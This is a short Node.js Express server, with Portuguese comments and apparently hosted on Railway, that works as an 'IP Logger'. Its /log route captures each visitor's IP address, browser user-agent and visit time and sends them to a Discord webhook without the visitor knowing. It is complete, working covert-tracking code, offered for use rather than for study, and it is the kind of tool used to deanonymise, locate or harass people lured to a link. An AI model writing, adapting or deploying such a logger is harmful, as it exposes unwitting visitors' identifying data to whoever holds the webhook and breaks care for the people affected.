const express = require("express");

const app = express();
const PORT = process.env.PORT || 3000;

// Necessário para pegar IP real no Railway
app.set("trust proxy", true);

// Servir arquivos estáticos
app.use(express.static("public"));

// Rota que captura IP e envia pro Discord
app.get("/log", async (req, res) => {
  const ip = req.ip;
  const ua = req.headers["user-agent"] || "Desconhecido";

  const time = new Date().toLocaleString("pt-BR", {
    timeZone: "America/Sao_Paulo"
  });

  try {
    await fetch(process.env.DISCORD_WEBHOOK, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        username: "IP Logger",
        embeds: [
          {
            title: "📡 Nova visita",
            color: 3447003,
            fields: [
              { name: "🌐 IP", value: ip, inline: false },
              { name: "🕒 Horário (BR)", value: time, inline: false },
              { name: "💻 Navegador", value: ua.slice(0, 1000), inline: false }
            ],
            footer: {
              text: "Railway • Express"
            }
          }
        ]
      })
    });
  } catch (err) {
    console.error("Erro ao enviar para o Discord:", err);
  }

  res.sendStatus(204);
});

app.listen(PORT, () => {
  console.log(`Servidor rodando na porta ${PORT}`);
});
